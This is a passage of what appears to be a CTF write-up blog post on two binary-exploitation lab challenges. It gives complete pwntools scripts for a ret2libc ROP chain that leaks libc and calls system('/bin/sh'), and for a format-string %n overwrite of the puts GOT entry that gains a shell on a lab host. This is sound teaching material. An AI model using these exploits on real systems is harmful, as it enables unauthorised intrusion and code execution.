+<p>The <code style="color:red;">GOT</code> stores addresses for global variables and functions used by the binary, while the <code style="color:red;">PLT</code> facilitates calling external functions, even if they are loaded at different addresses each time the binary runs.</p>
+
+<p>When an external function is called, the request initially goes through a <code style="color:red;">PLT</code> entry.</p>
+
+<p>On the first call, this <code style="color:red;">PLT</code> entry resolves the function’s actual address and updates the <code style="color:red;">GOT</code> entry with the correct address before jumping to it.</p>
+
+<p>On subsequent calls to the same function, the <code style="color:red;">PLT</code> entry uses the updated address in the <code style="color:red;">GOT</code>, directly jumping to this resolved address.</p>
+
+<p>In our case, the binary calls the <code style="color:red;">puts</code> function right before reading our input. Therefore, the <code style="color:red;">GOT</code> entry for <code style="color:red;">puts</code> will have been resolved with the function’s address from <code style="color:red;">libc</code>. We also know that calling a function’s <code style="color:red;">PLT</code> entry is equivalent to calling the function itself.</p>
+
+<p>By calling the <code style="color:red;">puts</code> function with its <code style="color:red;">GOT</code> entry as an argument, we can make the binary print the address of the <code style="color:red;">puts</code> function from <code style="color:red;">libc</code>. This address allows us to calculate the base address where <code style="color:red;">libc</code> is loaded and subsequently determine the addresses of other functions within <code style="color:red;">libc</code>.</p>
+
+<p>Also, to be able to call the <code style="color:red;">puts</code> function with the <code style="color:red;">GOT</code> entry as an argument, we need to pass the argument in the <code style="color:red;">RDI</code> register according to the Linux x64 calling convention. To achieve this, we need a way to load the address of the <code style="color:red;">GOT</code> entry into the <code style="color:red;">RDI</code> register. For this, we will use a gadget.</p>
+
+<p>Gadgets are basically sequences of instructions that end with a <code style="color:red;">ret</code> instruction. They allow us to perform specific operations while maintaining control over the program’s flow due to the <code style="color:red;">ret</code> instruction at the end.</p>
+
+<p>To set the <code style="color:red;">RDI</code> register, we will use the <code style="color:red;">pop rdi; ret</code> gadget found in the binary. Since <code style="color:red;">PIE</code> is not enabled, we know the address of this gadget and can use it directly.</p>
+
+<p>The <code style="color:red;">pop rdi</code> instruction pops the value from the top of the stack into the <code style="color:red;">RDI</code> register. Since we control the stack, we can place any value we want onto the stack. By doing this, we can set the argument for a function call, allowing us to pass the address of the <code style="color:red;">GOT</code> entry to the <code style="color:red;">puts</code> function.</p>
+
+<p>Now that we have everything we need, we can proceed to leak the <code style="color:red;">puts</code> address from the <code style="color:red;">GOT</code> entry as follows:</p>
+<div class=highlight>
+<pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+
+binary = ELF("./materials-TryPwnMeOne/TheLibrarian/thelibrarian", checksec=False)
+libc = ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)
+
+r = remote("10.10.74.205", 9008)
+
+rop = ROP(binary)
+pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = rop.find_gadget(["ret"])[0]
+
+payload = b"A" * 256                # offset to the RBP
+payload += b"B" * 8                 # overwrite the RBP
+payload += p64(ret)                 # ret for stack alignment
+payload += p64(pop_rdi_ret)         # pop rdi gadget
+payload += p64(binary.got["puts"])  # value for rdi
+payload += p64(binary.plt["puts"])  # call puts
+
+r.recvuntil(b"Again? Where this time? : ")
+r.sendline(payload)
+r.recvuntil(b"ok, let's go!\n\n")
+
+leaked_puts = u64(r.recvline().rstrip().ljust(8, b"\x00")) # parse the leaked address
+print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
+libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc
+print(f"[+] Calculated base address of libc: {hex(libc_base_address)}")
+</pre></div>
+<p>Now that we can leak an address from <code style="color:red;">libc</code> and calculate where it is loaded, what we can do next is, instead of exiting after leaking the address, we can make the program execute the <code style="color:red;">vuln</code> function again. This allows us to exploit the same vulnerability, but this time with knowledge of the <code style="color:red;">libc</code> base address and the ability to call the <code style="color:red;">system</code> function from <code style="color:red;">libc</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+
+binary = ELF("./materials-TryPwnMeOne/TheLibrarian/thelibrarian", checksec=False)
+libc = ELF("./materials-TryPwnMeOne/TheLibrarian/libc.so.6", checksec=False)
+
+r = remote("10.10.74.205", 9008)
+
+rop = ROP(binary)
+pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = rop.find_gadget(["ret"])[0]
+
+payload = b"A" * 256                        # offset to the RBP
+payload += b"B" * 8                         # overwrite the RBP
+payload += p64(ret)                         # ret for stack alignment
+payload += p64(pop_rdi_ret)                 # pop rdi gadget
+payload += p64(binary.got["puts"])          # value for rdi
+payload += p64(binary.plt["puts"])          # call puts
+payload += p64(binary.symbols["vuln"])      # jump back to vuln
+
+r.recvuntil(b"Again? Where this time? : ")
+r.sendline(payload)
+r.recvuntil(b"ok, let's go!\n\n")
+
+leaked_puts = u64(r.recvline().rstrip().ljust(8, b"\x00")) # parse the leaked address
+print(f"[+] Leaked address of puts from the GOT entry: {hex(leaked_puts)}")
+libc_base_address = leaked_puts - libc.symbols["puts"] # calculate the base address of libc
+
+print(f"[+] Calculated the base address of LIBC: {hex(libc_base_address)}")
+libc.address = libc_base_address                # set the libc base address to match the remote process's memory layout
+
+
+r.recvuntil(b"Again? Where this time? : ")
+payload2 = b"A" * 256                           # offset to the RBP
+payload2 += b"B" * 8                            # overwrite the RBP
+payload2 += p64(pop_rdi_ret)                    # pop rdi gadget
+# The libc library already includes the /bin/sh string. 
+# We can use the search function to find its address in libc.
+# Once we have this address, we can use the same gadget to set it as an argument for the system function.
+payload2 += p64(next(libc.search(b"/bin/sh")))  # value of rdi
+payload2 += p64(libc.symbols["system"])         # call system("/bin/sh")
+r.sendline(payload2)
+r.recvuntil(b"ok, let's go!\n\n")
+# r.interactive()                               # uncomment for an interactive shell
+r.sendline(b"cat flag.txt")
+print(r.recvline().decode())
+r.close()
+</pre></div>
+<h2>Not Specified</h2>
+<p>For the <code style="color: red;" >Not Specified</code> challenge, we are provided with the following reference code:</p>
+<div class=highlight><pre tabindex=0 class=chroma>int win(){
+    system("/bin/sh\0");
+}
+
+int main(){
+    setup();
+    banner();
+    char *username[32];
+    puts("Please provide your username\n");
+    read(0,username,sizeof(username));
+    puts("Thanks! ");
+    printf(username);
+    puts("\nbye\n");
+    exit(1);
+}
+</pre></div>
+<p>As before, the binary declares an array and reads our input into it. But this time it only reads a number of bytes equal to the size of the array, so there is no buffer overflow vulnerability.</p>
+<div class=highlight><pre tabindex=0 class=chroma>char *username[32];
+puts("Please provide your username\n");
+read(0,username,sizeof(username));
+</pre></div>
+<p>However, the binary passes our input directly to the <code style="color: red;" >printf</code> function as an argument, creating a format string vulnerability.</p>
+<div class=highlight><pre tabindex=0 class=chroma>printf(username);
+</pre></div>
+<p>Calling <code style="color:red;">printf</code> with our input allows us to use format specifiers. We can utilize format specifiers such as <code style="color:red;">%p</code> or <code style="color:red;">%c</code> to read values from the stack.</p>
+
+<div class=highlight><pre tabindex=0 class=chroma>$ nc 10.10.74.205 9009
+...
+Please provide your username
+%p
+Thanks!
+0x7fa6639cd723
+</pre></div>
+<p>We can also observe that our input is located as the sixth item on the stack.</p>
+<div class=highlight><pre tabindex=0 class=chroma>$ nc 10.10.74.205 9009
+Please provide your username
+
+AAAAAAAA%p.%p.%p.%p.%p.%p
+Thanks!
+AAAAAAAA0x7f31fa505723.(nil).0x7f31fa426297.0x9.0x4.0x4141414141414141
+</pre></div>
+<p>Knowing this, we can also reference it as such:</p>
+<div class=highlight><pre tabindex=0 class=chroma>$ nc 10.10.74.205 9009
+Please provide your username
+
+AAAAAAAA%6$p
+Thanks!
+AAAAAAAA0x4141414141414141
+</pre></div>
+<p>Additionally, we can use the <code style="color: red;" >%n</code> format specifier to write to the program’s memory. This specifier writes the number of characters printed so far into the specified memory location.</p>
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+
+r = process("./materials-TryPwnMeOne/NotSpecified/notspecified")
+gdb.attach(r)
+
+payload = b"A" * 8
+payload += b"%6$n"
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+r.interactive()
+</pre></div>
+<p>We can see that it crashes inside <code style="color:red;">printf</code> because it attempts to write the value <code style="color:red;">8</code> to the address <code style="color: red;">0x4141414141414141</code>, which is not a valid memory address that the program can access.</p>
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img src="../02.webp" alt="highlight" style="display: block;">
+</div>
+<p>So, how can we exploit this? We observe that the binary calls the <code style="color:red;">puts</code> function both before reading our input and after the call to <code style="color:red;">printf</code>.</p>
+
+<p>From previous challenges, we know that after the first call to <code style="color:red;">puts</code>, its <code style="color:red;">GOT</code> entry will store the function’s address in memory and subsequent calls to the <code style="color:red;">puts</code> function will use this resolved address. To exploit this, we can overwrite the address in the <code style="color:red;">GOT</code> entry with the address of the <code style="color:red;">win</code> function. Consequently, when <code style="color:red;">puts</code> is called again, it will execute the <code style="color:red;">win</code> function instead.</p>
+<h2>Creating the Payload Manually</h2>
+<p>Let’s begin with our manual exploit attempt. First, we will modify our payload by placing our input after the format specifiers. This is because we will use the format specifiers to overwrite memory addresses, by changing our input to those memory addresses which include null bytes <code style="color: red;">(0x00)</code>. These null bytes will cause printf to stop printing when it encounters them.</p>
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+r = process()
+payload = b"%12$p %13$p %14$p %15$p".ljust(48, b"-")
+payload += b"A"*8
+payload += b"B"*8
+payload += b"C"*8
+payload += b"D"*8
+
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+print(r.recvall().decode())
+r.close()
+</pre></div>
+<p>We can see that we are able to locate our inputs on the stack using the offsets 12, 13, 14, and 15.</p>
+<div class=highlight><pre tabindex=0 class=chroma>$ python3 exploit.py
+
+Thanks!
+0x4141414141414141 0x4242424242424242 0x4343434343434343 0x4444444444444444-------------------------AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD
+
+bye
+</pre></div>
+<p>Now, all we have to do is modify our input to target the memory address of the <code style="color:red;">puts</code> function’s <code style="color:red;">GOT</code> entry and attempt to write the address of the <code style="color:red;">win</code> function to it which we can discover as <code style="color:red;">0x4011f6</code> using <code style="color:red;">readelf</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma>$ readelf -s ./materials-TryPwnMeOne/NotSpecified/notspecified | grep win
+    62: 00000000004011f6    23 FUNC    GLOBAL DEFAULT   15 win
+</pre></div>
+<p>However, since <code style="color:red;">%n</code> writes the number of characters printed so far to the specified memory address, and printing <code style="color:red;">0x4011f6</code> characters is impractical, we will write the address in multiple steps.</p>
+
+<p>First, we will clear the address using the <code style="color:red;">ll</code> length sub-specifier with <code style="color:red;">%n</code>. This will make <code style="color:red;">printf</code> write the number of characters printed as a <code style="color:red;">long long int</code> (8 bytes). Since no characters are printed yet, this will essentially zero out the address specified.</p>
+
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+puts_got = binary.got["puts"]
+
+r = process()
+gdb.attach(r)
+
+payload = b"%12$lln %13$p %14$p %15$p".ljust(48, b"-")
+payload += p64(puts_got)
+payload += b"B"*8
+payload += b"C"*8
+payload += b"D"*8
+
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+r.interactive()
+r.close()
+</pre></div>
+<p>Checking this in <code style="color: red;" >GDB</code>, we can confirm that it works as expected.</p>
+<div class=highlight><pre tabindex=0 class=chroma>pwndbg> x/gx &'puts@got.plt'
+0x404020 <puts@got.plt>:        0x0000000000000000
+</pre></div>
+<p>Next, we can write the least significant byte (<code style="color:red;">0xf6</code>) of the <code style="color:red;">win</code> function’s address (<code style="color:red;">0x4011f6</code>). To do this, we first make <code style="color:red;">printf</code> print <code style="color:red;">246</code> characters (which corresponds to <code style="color:red;">0xf6</code> in hexadecimal) using <code style="color:red;">%246c</code>, then using the <code style="color:red;">%13$n</code> format specifier to write this value to the address.</p>
+
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+puts_got = binary.got["puts"]
+
+r = process()
+gdb.attach(r)
+
+payload = b"%12$lln%246c%13$n %14$p %15$p".ljust(48, b"-")
+payload += p64(puts_got)
+payload += p64(puts_got)
+payload += b"C"*8
+payload += b"D"*8
+
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+r.interactive()
+r.close()
+</pre></div>
+<p>We see this works as expected.</p>
+<div class=highlight><pre tabindex=0 class=chroma>pwndbg> x/gx &'puts@got.plt'
+0x404020 <puts@got.plt>:        0x00000000000000f6
+</pre></div>
+<p>Next, we will move on to writing <code style="color:red;">0x11</code>, the second least significant byte of the <code style="color:red;">win</code> function’s address (<code style="color:red;">0x4011f6</code>). Since we have already printed <code style="color:red;">246</code> characters (which exceeds <code style="color:red;">0x11</code>), we can print an additional <code style="color:red;">27</code> bytes to make the total count of printed characters <code style="color:red;">273</code> (<code style="color:red;">0x111</code> in hexadecimal).</p>
+
+<p>Then, we will use the <code style="color:red;">hh</code> (char) length sub-specifier with <code style="color:red;">%n</code> to ensure that <code style="color:red;">printf</code> writes only the least significant byte (<code style="color:red;">0x11</code>) of the printed character count (<code style="color:red;">0x111</code>).</p>
+
+<p>Additionally, in our input, we need to increment the address so that <code style="color:red;">printf</code> writes to the next byte.</p>
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+puts_got = binary.got["puts"]
+
+r = process()
+gdb.attach(r)
+
+payload = b"%12$lln%246c%13$n%27c%14$hhn %15$p".ljust(48, b"-")
+payload += p64(puts_got)
+payload += p64(puts_got)
+payload += p64(puts_got+1)
+payload += b"D"*8
+
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+r.interactive()
+r.close()
+</pre></div>
+<div class=highlight><pre tabindex=0 class=chroma>pwndbg> x/gx &'puts@got.plt'
+0x404020 <puts@got.plt>:        0x00000000000011f6
+</pre></div>
+<p>Finally, to write the last byte, <code style="color:red;">0x40</code>, we need to print <code style="color:red;">47</code> additional characters. This will make the total count of printed characters <code style="color:red;">0x140</code>.</p>
+<p>To calculate this:</p>
+<p><ul><li><code style="color:red;">0x140</code> (total characters needed) - <code style="color:red;">0x111</code> (characters already printed) = <code style="color:red;">0x2f</code> (47 additional characters)</li></ul></p>
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+puts_got = binary.got["puts"]
+
+r = process()
+payload = b"%12$lln%246c%13$n%27c%14$hhn%47c%15$hhn".ljust(48, b"-")
+payload += p64(puts_got)
+payload += p64(puts_got)
+payload += p64(puts_got+1)
+payload += p64(puts_got+2)
+
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+r.interactive()
+r.close()
+</pre></div>
+<p>With this, we successfully overwrite the <code style="color:red;">GOT</code> entry for <code style="color:red;">puts</code> with the address of the <code style="color:red;">win</code> function.</p>
+
+<div class=highlight><pre tabindex=0 class=chroma>pwndbg> x/gx &'puts@got.plt'
+0x404020 <puts@got.plt>:        0x00000000004011f6
+</pre></div>
+<p>Now, we can modify our script to exploit the remote target and gain a shell.</p>
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+puts_got = binary.got["puts"]
+
+r = remote("10.10.74.205", 9009)
+payload = b"%12$lln%246c%13$n%27c%14$hhn%47c%15$hhn".ljust(48, b"-")
+payload += p64(puts_got)
+payload += p64(puts_got)
+payload += p64(puts_got+1)
+payload += p64(puts_got+2)
+
+r.recvuntil(b"Please provide your username\n")
+r.sendline(payload)
+r.interactive()
+r.close()
+</pre></div>
+<div class=highlight><pre tabindex=0 class=chroma>$ python3 exploit.py
+
+Thanks!
+...
+$ id
+uid=1000 gid=1000 groups=1000
+$ wc -c flag.txt
+37 flag.txt
+
+</pre></div>
+<h2>Using pwntools for Payload Generation</h2>
+<p>Alternatively, instead of manually generating our payload for the <code style="color:red;">format string</code> vulnerability, we could use the <code style="color:red;">fmtstr_payload</code> function from <code style="color:red;">pwntools</code> to create it for us.</p>
+
+<p>All we need to do is provide the <code style="color:red;">offset</code> of our input on the stack, the <code style="color:red;">address</code> where we want to write, and the <code style="color:red;">value</code> we want to write, as shown below:</p>
+
+<div class=highlight><pre tabindex=0 class=chroma>#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level = "error")
+context.binary = binary = ELF("./materials-TryPwnMeOne/NotSpecified/notspecified", checksec=False)
+
+r = remote("10.10.74.205", 9009)
+payload = fmtstr_payload(6, {binary.got["puts"] : binary.symbols["win"]})
+r.sendline(payload)
+r.interactive()
+r.close()
+</pre></div>
+
+</main>
+    <footer class="flex flex-none justify-center">
+        <section
+            class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+            <div class="flex flex-row"><a href=https://www.linkedin.com/in/whitedevil2468 target=_blank title=LinkedIn
+                    class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
+                    <i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin"
+                            viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none"
+                            stroke-linecap="round" stroke-linejoin="round">
+                            <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                            <path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z" />
+                            <path d="M8 11v5" />
+                            <path d="M8 8v.01" />
+                            <path d="M12 16v-5" />
+                            <path d="M16 16v-3a2 2 0 00-4 0" />
+                        </svg></i></a></div>
+            <div class=grow></div>
+            <div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright"
+                        viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                        <path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12" />
+                        <path
+                            d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25" />
+                    </svg>
+                </i>2024 W41T3XD3v1L</div>
+        </section>
+    </footer>
+    <script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script>
+    <div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg
+                class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor"
+                fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                <path
+                    d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z" />
+                <path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1" />
+            </svg></i></div>
+    <div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg
+                class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor"
+                fill="none" stroke-linecap="round" stroke-linejoin="round">
+                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+                <path d="M5 12l5 5L20 7" />
+            </svg></i></div>
+    <script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script>
+</body>
+
+</html>
